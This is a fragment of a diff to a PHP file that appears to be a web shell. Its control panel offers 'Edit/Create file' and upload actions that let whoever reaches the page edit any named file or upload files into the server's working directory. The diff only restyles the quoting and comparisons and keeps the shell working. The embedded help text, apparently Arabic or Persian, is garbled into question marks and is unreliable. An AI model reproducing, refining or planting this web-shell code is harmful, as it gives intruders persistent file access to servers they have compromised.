     <font face="verdana" size="2" color="#DCE7EF">::</font></a></font></b><a href="?act=edit" bookmark="minipanel"><span lang="en-us"><font face="Verdana" size="2">Edit/Create
     file</font></span></a><b><font face="verdana" color="red" size="4"><a style="font-weight: normal; font-family: verdana; text-decoration: none" bookmark="minipanel"><font face="verdana" size="2" color="#DCE7EF">::</font></a></font></b><font face="Wingdings 2" size="2">"</font></p><p align="center">
      <?php
-if ($act == "edit") {
-    echo "<center><b>??????? ????????:<br><br> ?? ???? ??? ????? ???? ???? ?????? ???<br>???? ???? ????? ??? config.php ????<br>Edit<br>????? ?? ????? ??? ??????? ????? <br>????? ? ??? ???? ????? ??? ??? ?? ???? ?? ???????? <br>???? ???? ???? ?????? washer-stres.txt   </a>.</b>";
+if ('edit' == $act) {
+    echo '<center><b>??????? ????????:<br><br> ?? ???? ??? ????? ???? ???? ?????? ???<br>???? ???? ????? ??? config.php ????<br>Edit<br>????? ?? ????? ??? ??????? ????? <br>????? ? ??? ???? ????? ??? ??? ?? ???? ?? ???????? <br>???? ???? ???? ?????? washer-stres.txt   </a>.</b>';
 }
 ?>
     </p>
@@ -901,15 +871,15 @@ if ($act == "edit") {
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
 Dosya Düzenle:
 <input type=\"text\" name=\"editfile\" >
-<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
-<INPUT type=\"submit\" value=\"Edit\"></form></div>";
+<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . '">
+<INPUT type="submit" value="Edit"></form></div>';
 ?>
     </p>
     </form></center></p></td>
 <td width="50%" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
                  <?php
-if ($act == "upload") {
-    echo "<center><b>??? ???????:<br><br>?? ?????? ????? ?????? ???? <br>???? ???? ?? ?????? ??? ?????? ??????<br>UPLOAD< </a>.</b>";
+if ('upload' == $act) {
+    echo '<center><b>??? ???????:<br><br>?? ?????? ????? ?????? ???? <br>???? ???? ?? ?????? ??? ?????? ??????<br>UPLOAD< </a>.</b>';
 }
 ?><a bookmark="minipanel"><b><font size="2">::
     </font>
@@ -919,8 +889,8 @@ if ($act == "upload") {
         echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <INPUT type=\"file\" name=\"userfile\">
 <INPUT type=\"hidden\" name=\"post\" value=\"yes\">
-<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
-<INPUT type=\"submit\" value=\"Download\"></form></div>";
+<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . '">
+<INPUT type="submit" value="Download"></form></div>';
 ?>
     <p></form></p></td>
 
